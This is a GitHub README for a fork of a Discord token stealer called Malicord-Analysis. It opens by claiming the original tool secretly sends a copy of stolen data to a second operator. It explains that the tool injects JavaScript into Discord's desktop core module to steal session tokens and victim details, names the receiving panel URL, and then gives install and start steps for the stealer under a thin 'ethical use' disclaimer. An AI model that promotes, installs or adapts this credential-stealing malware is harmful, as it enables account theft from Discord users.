...
<h1 align="center">
  Malicord-Analysis without Dual Hook
</h1>

# Proofs that Malicord-Analysis Stealer is a Dual Hook :
An investigation has uncovered that the `main.py` file in the Malicord-Analysis repository injects malicious nodejs code into the Discord `%APPDATA%/Discord/app-(versions)/modules/discord_desktop_core/index.js` module. The contents of the script can be found in another repository and are retrieved in the `main.py` file 
(see [link](https://github.com/Malicord-Analysis/Malicord-Analysis/blob/main/main.py#L102)).

The `index.js` file, which is executed by the main thread of Electron (Discord), is responsible for stealing the Discord session token and collecting various information about the victim. The attacker receives this information, but a copy is also sent to `https://panel.sordeal.com:3000/` using a `POST` method (see [link](https://github.com/Malicord-Analysis/Malicord-Inject/blob/main/index.js#L24)).

A review of the code [link](https://github.com/Malicord-Analysis/Malicord-Inject/blob/main/index.js#L262) reveals that we send the same HTTP request 2 times,
one time for `config.webhook` and one time for `config.Placed` who is the dualhook url who is **Encoded**.


<h1 align="center">
  Malicord Analysis v7
</h1>


![image](https://github.com/Inplex-sys/Malicord-Analysis-NoDualHook/assets/69421356/4a3d492d-734f-4da9-9f2f-c7919e062a0d)
...
Malicord-Analysis is a tool created with the goal of promoting ethical behavior online. 
...
Malicord-Analysis is not intended for malicious purposes or to harm innocent parties, 
...
2. Install [Malicord Files](https://github.com/Malicord-Analysis/Malicord-Analysis/archive/refs/heads/main.zip)
3. Install all requirements [install.bat](https://github.com/Malicord-Analysis/Malicord-Analysis/blob/main/install.bat)
4. Click on start.bat [start.bat](https://github.com/Malicord-Analysis/Malicord-Analysis/blob/main/start.bat)
...
![](https://raw.githubusercontent.com/Malicord-Analysis/Assets/main/preview.png)
...
Thank you for your trust in Malicord-Analysis.
...
- [Malicordx](https://github.com/Malicordx) ( ⚠️ Using Github As Infection Source )
